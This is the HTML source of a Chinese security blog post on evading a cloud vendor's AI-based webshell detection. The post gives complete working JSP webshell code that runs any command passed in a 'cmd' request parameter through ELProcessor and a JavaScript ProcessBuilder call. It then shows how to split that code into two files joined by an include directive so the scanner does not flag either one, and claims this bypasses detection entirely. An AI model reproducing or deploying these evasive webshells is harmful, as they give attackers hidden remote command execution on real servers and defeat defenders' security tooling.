@@ -1,0 +1,606 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no">
+<meta name="author" content="Jayl1n">
+<meta name="baidu-site-verification" content="elXpeED2jg">
+
+
+
+<meta name="description" content="玩某云的“卷完计划”想到的姿势，分享一下。 某云的骑士号称是采用先进的动态监测技术，结合主机智能内核AI检测技术等多种引擎零规则查杀，做到低误报，高查杀率。 测下来查杀率确实高，只要出现 Runtime.getRuntime().exec(&amp;quot;calc&amp;quot;) 等命令执行直接相关的方法调用就杀，不过一个样本测下来要一分钟，速度相当慢，实际落地还要很长的路要走。/狗头 绕过开始讲绕过。">
+<meta name="keywords" content="Java,RedTeam,红蓝对抗,JSP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JSP免杀 —— 绕过智能AI？">
+<meta property="og:url" content="https://jayl1n.github.io/2021/02/05/antiav-jsp-webshell/index.html">
+<meta property="og:site_name" content="Jayl1n&#39;s Blog">
+<meta property="og:description" content="玩某云的“卷完计划”想到的姿势，分享一下。 某云的骑士号称是采用先进的动态监测技术，结合主机智能内核AI检测技术等多种引擎零规则查杀，做到低误报，高查杀率。 测下来查杀率确实高，只要出现 Runtime.getRuntime().exec(&amp;quot;calc&amp;quot;) 等命令执行直接相关的方法调用就杀，不过一个样本测下来要一分钟，速度相当慢，实际落地还要很长的路要走。/狗头 绕过开始讲绕过。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2023-08-16T15:16:43.176Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="JSP免杀 —— 绕过智能AI？">
+<meta name="twitter:description" content="玩某云的“卷完计划”想到的姿势，分享一下。 某云的骑士号称是采用先进的动态监测技术，结合主机智能内核AI检测技术等多种引擎零规则查杀，做到低误报，高查杀率。 测下来查杀率确实高，只要出现 Runtime.getRuntime().exec(&amp;quot;calc&amp;quot;) 等命令执行直接相关的方法调用就杀，不过一个样本测下来要一分钟，速度相当慢，实际落地还要很长的路要走。/狗头 绕过开始讲绕过。">
+
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="Jayl1n&#39;s Blog" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/img/cat.jpg">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="../../../../css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>JSP免杀 —— 绕过智能AI？ | Jayl1n&#39;s Blog</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+    <script>
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "//hm.baidu.com/hm.js?08bebd32e2a42a1273ff796a43439f77";
+            var s = document.getElementsByTagName("script")[0]; 
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+
+</head></html>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/cat.jpg" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Jayl1n</a></h1>
+        </hgroup>
+
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="../../../../index.html">主页</a></li>
+                        
+                            <li><a href="../../../../archives/">所有文章</a></li>
+                        
+                            <li><a href="../../../../tags/">标签云</a></li>
+                        
+                            <li><a href="../../../../about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:panja@foxmail.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" href="https://www.github.com/Jayl1n" title="GitHub"></a>
+                            
+                                <a class="fa RSS" href="../../../../atom.xml" title="RSS"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/BLOG/">BLOG</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/JSP/">JSP</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Java/">Java</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/PHP/">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Pentest/">Pentest</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Pwn/">Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Python/">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/RedTeam/">RedTeam</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/SQLi/">SQLi</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Web/">Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/i春秋/">i春秋</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/二进制/">二进制</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/代码审计/">代码审计</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/工具分享/">工具分享</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/开发/">开发</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/心路/">心路</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/日常/">日常</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/浏览器/">浏览器</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/爬虫/">爬虫</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/红蓝对抗/">红蓝对抗</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://redteam.today">李三的剑谱</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://blog.l0ca1.xyz/">l0cal</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://7o8v.me/">7o8v</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://godot.win/">Godot</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://evoa.me/">evoA</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://abcdefghijklmnopqrst.xyz/">骑麦兜看落日</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://kkdlong.win">kkdlong</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">专注于安全</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Jayl1n</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/cat.jpg" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">Jayl1n</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="../../../../index.html">主页</a></li>
+                
+                    <li><a href="../../../../archives/">所有文章</a></li>
+                
+                    <li><a href="../../../../tags/">标签云</a></li>
+                
+                    <li><a href="../../../../about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:panja@foxmail.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="https://www.github.com/Jayl1n" title="GitHub"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="../../../../atom.xml" title="RSS"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-antiav-jsp-webshell" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="" class="article-date">
+      <time datetime="2021-02-05T14:25:31.000Z" itemprop="datePublished">2021-02-05</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      JSP免杀 —— 绕过智能AI？
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../../../tags/JSP/">JSP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../../../tags/Java/">Java</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../../../tags/RedTeam/">RedTeam</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../../../tags/红蓝对抗/">红蓝对抗</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>玩某云的“卷完计划”想到的姿势，分享一下。</p>
+<p>某云的骑士号称是采用先进的动态监测技术，结合主机智能内核AI检测技术等多种引擎零规则查杀，做到低误报，高查杀率。</p>
+<p>测下来查杀率确实高，只要出现 <code>Runtime.getRuntime().exec(&quot;calc&quot;)</code> 等命令执行直接相关的方法调用就杀，不过一个样本测下来要一分钟，速度相当慢，实际落地还要很长的路要走。/狗头</p>
+<h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><p>开始讲绕过。</p>
+<p>首先是命令执行的sink，直接写 <code>Runtime.getRuntime().exec()</code> 即使jsp编译不通过也是会被check到的，说明引擎有一些强检测逻辑，类似正则，匹配即杀。而如果迂回一下，我们找一个跳板，比如 <code>new ProcessBuilder()</code> ，或者反射构造 <code>ProcessImpl</code> 实例，还不会被杀，(用法参考<a href="https://xz.aliyun.com/t/7798" target="_blank" rel="noopener">三梦的文章</a>)。</p>
+<p>构造好跳板，当调用 <code>start()</code> 实际执行的时候，如果命令是硬编码的没有杀，如果是从 request.getParameter(“xxx”) 取的还是会杀的。</p>
+<p>说明引擎应该用到了类似污点分析的原理，更换命令执行的 sink 是可以绕过的，但要完全绕过还要找别的 source，试了一圈 request 对象的方法，只有 request.getSchema() 等内容不可控方法的时候不会杀，内容不可控有啥用:(</p>
+<p>研究了下，我想到了这个引擎的问题（应该也通杀别的），就是在检测时，无法构造出完整的上下文环境。它是单文件一个个扫过去的，如果我们拆分 soure-sink 到多个文件呢，扫任意一个jsp都没问题。甚至很可能因为通不过编译，压根儿动态监测不起来。</p>
+<h1 id="include"><a href="#include" class="headerlink" title="include"></a>include</h1><p>下面用到 jsp 的一个特性 include 指令。</p>
+<blockquote>
+<p>include 指令用于通知 JSP 引擎在翻译当前 JSP 页面时，将其他文件中的内容合并进当前 JSP 页面转换成的 Servlet 源文件中，这种在源文件级别进行引入的方式，称为静态引入，当前 JSP 页面与静态引入的文件紧密结合为一个 Servlet。这些文件可以是 JSP 页面、HTML 页面、文本文件或是一段 Java 代码。</p>
+</blockquote>
+<p>我们完全可以把完整的逻辑拆分，即把参数获取和命令执行的分开。</p>
+<p>举个例子</p>
+<p>AB.jsp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page import=&quot;javax.el.ELProcessor&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.BufferedReader&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.InputStreamReader&quot; %&gt;</span><br><span class="line">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String cmd = request.getParameter(&quot;cmd&quot;);</span><br><span class="line">    ELProcessor processor = new ELProcessor();</span><br><span class="line">    Process process = (Process) processor.eval(</span><br><span class="line">            &quot;\&quot;\&quot;.getClass()&quot; +</span><br><span class="line">                    &quot;.forName(\&quot;javax.script.ScriptEngineManager\&quot;).&quot; +</span><br><span class="line">                    &quot;newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&apos;(java.lang.String[])&apos;]([&apos;&quot; +</span><br><span class="line">                    cmd + &quot;&apos;]).start()\&quot;)&quot;);</span><br><span class="line">    InputStream inputStream = process.getInputStream();</span><br><span class="line">    StringBuilder sb = new StringBuilder();</span><br><span class="line">    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));</span><br><span class="line">    String line;</span><br><span class="line">    while ((line = bufferedReader.readLine()) != null) &#123;</span><br><span class="line">        sb.append(line).append(&quot;\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    response.getOutputStream().write(sb.toString().getBytes());</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>source request.getParameter，通过 sink ELProcessor.eval 执行命令，会被杀。</p>
+<p>拆分逻辑到 A.jsp B.jsp</p>
+<p>A.jsp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    String cmd = request.getParameter(&quot;cmd&quot;);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+<p>B.jsp ELProcessor.eval 执行命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;javax.el.ELProcessor&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.BufferedReader&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.InputStreamReader&quot; %&gt;</span><br><span class="line">&lt;%@include file=&quot;A.jsp&quot; %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    ELProcessor processor = new ELProcessor();</span><br><span class="line">    Process process = (Process) processor.eval(</span><br><span class="line">            &quot;\&quot;\&quot;.getClass()&quot; +</span><br><span class="line">                    &quot;.forName(\&quot;javax.script.ScriptEngineManager\&quot;).&quot; +</span><br><span class="line">                    &quot;newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&apos;(java.lang.String[])&apos;]([&apos;&quot; +</span><br><span class="line">                    cmd + &quot;&apos;]).start()\&quot;)&quot;);</span><br><span class="line">    InputStream inputStream = process.getInputStream();</span><br><span class="line">    StringBuilder sb = new StringBuilder();</span><br><span class="line">    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));</span><br><span class="line">    String line;</span><br><span class="line">    while ((line = bufferedReader.readLine()) != null) &#123;</span><br><span class="line">        sb.append(line).append(&quot;\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    response.getOutputStream().write(sb.toString().getBytes());</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>A.jsp 只负责取参，看起来没有问题。</p>
+<p>B.jsp sink没有被硬杀，而且缺少 A.jsp 的情况编译不过，跑不起来动态监测不了。</p>
+<p>完全绕过。</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="">JSP免杀 —— 绕过智能AI？</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">Jayl1n</a></p>
+        <p><span>发布时间:</span>2021-02-05, 22:25:31</p>
+        <p><span>最后更新:</span>2023-08-16, 23:16:43</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="" title="JSP免杀 —— 绕过智能AI？">https://jayl1n.github.io/2021/02/05/antiav-jsp-webshell/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://jayl1n.github.io/2021/02/05/antiav-jsp-webshell/　　作者: Jayl1n" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="../../../06/23/compile-v8-on-windows10/">
+                    在 Win10 上编译 V8 引擎
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="../../../01/03/compile-virtualbox-on-macos10-15/">
+                    MacOS 下编译 VirtualBox
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#绕过"><span class="toc-number">1.</span> <span class="toc-text">绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#include"><span class="toc-number">2.</span> <span class="toc-text">include</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"JSP免杀 —— 绕过智能AI？　| Jayl1n's Blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+        <section id="comments">
+    <style> aside.comment-bar { margin: auto 30px; }</style>
+    <div id="disqus_thread"></div>
+    <script>
+        var disqus_config = function(){
+            this.page.url = 'https://jayl1n.github.io/2021/02/05/antiav-jsp-webshell/';
+            this.page.identifier = '2021/02/05/antiav-jsp-webshell/';
+        };
+        var loadComment = function(){
+            var d = document, s = d.createElement('script');
+            s.src = '//jayl1n-github-io.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        }
+    </script>
+    
+    <script> loadComment(); </script>
+
+</section>
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="../../../06/23/compile-v8-on-windows10/" title="上一篇: 在 Win10 上编译 V8 引擎">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="../../../01/03/compile-virtualbox-on-macos10-15/" title="下一篇: MacOS 下编译 VirtualBox">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="../../../../2022/02/27/v8-sandbox-escape/">V8 沙盒绕过</a></li><li class="post-list-item"><a class="post-list-link" href="../../../10/05/pentest-gb28181-attack/">GB28181 的一点小问题</a></li><li class="post-list-item"><a class="post-list-link" href="../../../07/07/realpwn-heap-spary-exercise/">【RealPwn-2】 堆喷练习</a></li><li class="post-list-item"><a class="post-list-link" href="../../../07/04/realpwn-vtable-hijacking-exercise/">【RealPwn-1】 虚函数表劫持练习</a></li><li class="post-list-item"><a class="post-list-link" href="../../../07/01/use-inlinehook-technology-to-make-a-more-general-webshell/">利用 Hook 技术打造通用的 Webshell</a></li><li class="post-list-item"><a class="post-list-link" href="../../../06/23/compile-v8-on-windows10/">在 Win10 上编译 V8 引擎</a></li><li class="post-list-item"><a class="post-list-link" href="">JSP免杀 —— 绕过智能AI？</a></li><li class="post-list-item"><a class="post-list-link" href="../../../01/03/compile-virtualbox-on-macos10-15/">MacOS 下编译 VirtualBox</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2020/04/10/pentest-cobaltstrike-improve/">魔改 CobaltStrike 3.14 实现域前置自定义端口</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2020/02/13/java-nohup-implementation/">Java 实现后台执行</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2020/01/04/happy-new-year-2020/">2020 大家新年快乐鸭</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/06/26/sctf-2019-babyEoP-Writeup/">SCTF2019 babyEoP Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/03/29/pentest-getpassword/">Windows下抓取明文密码</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/01/08/tools-load-shellcode/">【GSL】 从内存加载 SHELLCODE 绕过AV查杀</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2018/12/30/java-audit-step-by-step-4/">从1开始的Java代码审计·第四弹·SSRF</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2018/11/15/java-audit-step-by-step-3/">从1开始的Java代码审计·第三弹·SQL注入</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2018/10/29/java-audit-step-by-step-2/">从1开始的Java代码审计·第二弹·基础篇（下）</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2018/10/25/java-audit-step-by-step-1/">从1开始的Java代码审计·第一弹·基础篇（上）</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2018/10/25/java-audit-step-by-step-0/">从1开始的Java代码审计·序</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2018/10/05/pentest-20181005/">渗透日记-20181005</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2018/09/18/summary-command-execution/">PHP中的命令执行</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2018/09/11/ichunqiu-web-BLOG/">i春秋-Web-BLOG</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2018/09/10/ichunqiu-web-SQLi/">i春秋-Web-SQLi</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2018/09/09/daily-life-20180909/">日常心路-180909</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2018/08/01/crawl-admin5/">爬虫之批量下载Admin5源码</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2018/07/31/yesterday-and-tomorrow/">昨天，明天</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2018-2023 Jayl1n
+            </div>
+            <div class="footer-right">
+                <span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+
+<script>
+    var now = new Date(); 
+    function createtime() { 
+        var grt= new Date("07/31/2018 00:00:00");//此处修改你的建站时间或者网站上线时间 
+        now.setTime(now.getTime()+250); 
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); 
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); 
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); 
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} 
